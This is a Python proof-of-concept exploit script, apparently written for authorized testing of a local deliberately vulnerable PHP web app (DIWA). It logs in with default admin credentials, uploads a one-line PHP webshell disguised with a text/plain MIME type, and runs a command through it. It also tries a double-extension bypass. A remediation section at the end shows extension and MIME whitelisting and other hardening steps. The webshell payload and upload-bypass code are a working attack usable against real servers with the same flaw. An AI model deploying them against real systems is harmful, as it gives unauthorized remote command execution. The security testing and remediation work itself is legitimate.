#!/usr/bin/env python3
"""
Stage 2 POC: Insecure File Upload - No Extension/MIME Validation
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: upload.php only checks file existence, not extension or content type
"""

import requests
import sys
import io
import uuid

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_insecure_file_upload():
    """
    Upload a PHP file with .php extension or disguise it as a legitimate file.
    Payload: Minimal PHP webshell with .php extension
    Expected: File uploaded and executable (webshell access gained)
    """
    print("[*] Testing Insecure File Upload (No Extension Validation)...")
    
    try:
        # Login first
        login_payload = {
            'email': 'admin@example.com',
            'password': 'admin'
        }
        resp = SESSION.post(f"{TARGET}/?page=login", data=login_payload)
        
        # Create PHP webshell payload
        php_shell = b'<?php system($_GET["cmd"]); ?>'
        unique_name = f"shell{str(uuid.uuid4())[:6]}.php"
        
        # Prepare multipart upload
        files = {
            'file': (unique_name, io.BytesIO(php_shell), 'text/plain')
        }
        data = {
            'title': f'Test Upload {unique_name}',
            'description': 'Testing file upload',
            'guests': '1'
        }
        
        # Submit upload
        resp = SESSION.post(
            f"{TARGET}/?page=upload",
            files=files,
            data=data
        )
        
        # Check for successful upload message
        if 'saved' in resp.text or 'uploaded' in resp.text.lower():
            print("✅ VULNERABLE: PHP file uploaded successfully")
            
            # Try to execute the uploaded PHP file
            resp_exec = SESSION.get(f"{TARGET}/app/files/{unique_name}?cmd=id")
            if resp_exec.status_code == 200 and ('uid=' in resp_exec.text or 'root' in resp_exec.text):
                print("✅ VULNERABLE: Uploaded PHP file is executable (RCE possible)")
                return True
            
            # At minimum, file was uploaded
            return True
        
        # Try uploading with double extension bypass (.php.txt)
        double_ext_name = f"shell{str(uuid.uuid4())[:6]}.php.txt"
        files2 = {
            'file': (double_ext_name, io.BytesIO(php_shell), 'text/plain')
        }
        resp2 = SESSION.post(
            f"{TARGET}/?page=upload",
            files=files2,
            data=data
        )
        
        if 'saved' in resp2.text or 'uploaded' in resp2.text.lower():
            print("✅ VULNERABLE: Double extension bypass allowed")
            return True
        
        print("❌ NOT REPRODUCIBLE: File upload blocked or validated")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_insecure_file_upload()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Implement strict file validation: extension whitelist, MIME type check, content inspection:

  $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'zip'];
  $allowed_mimes = [
      'image/jpeg', 'image/png', 'image/gif', 
      'application/pdf', 'application/msword'
  ];
  
  $uploaddir = ROOT_PATH . '/files/';
  $filename = $_FILES['file']['name'];
  $file_ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
  $file_mime = mime_content_type($_FILES['file']['tmp_name']);
  
  // Validate extension
  if (!in_array($file_ext, $allowed_extensions)) {
      $errors[] = 'File type not allowed.';
  }
  
  // Validate MIME type
  if (!in_array($file_mime, $allowed_mimes)) {
      $errors[] = 'MIME type not allowed.';
  }
  
  // Generate random filename to prevent execution
  $new_filename = bin2hex(random_bytes(16)) . '.' . $file_ext;
  $uploadfile = $uploaddir . $new_filename;
  
  // Move and verify
  if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
      chmod($uploadfile, 0644);  // Remove execute permissions
      $model->createDownload($allowGuests, $isAdmin, $_POST['title'], 
                            $_POST['description'], $new_filename);
  }

Key points:
- Whitelist allowed extensions and MIME types
- Check Content-Type header + file magic bytes (finfo_file)
- Rename uploaded files to random names (prevents extension exploits)
- Store uploads outside webroot if possible
- Disable PHP execution in upload directory (.htaccess or php.ini)
- Remove execute permissions (chmod 0644)
"""
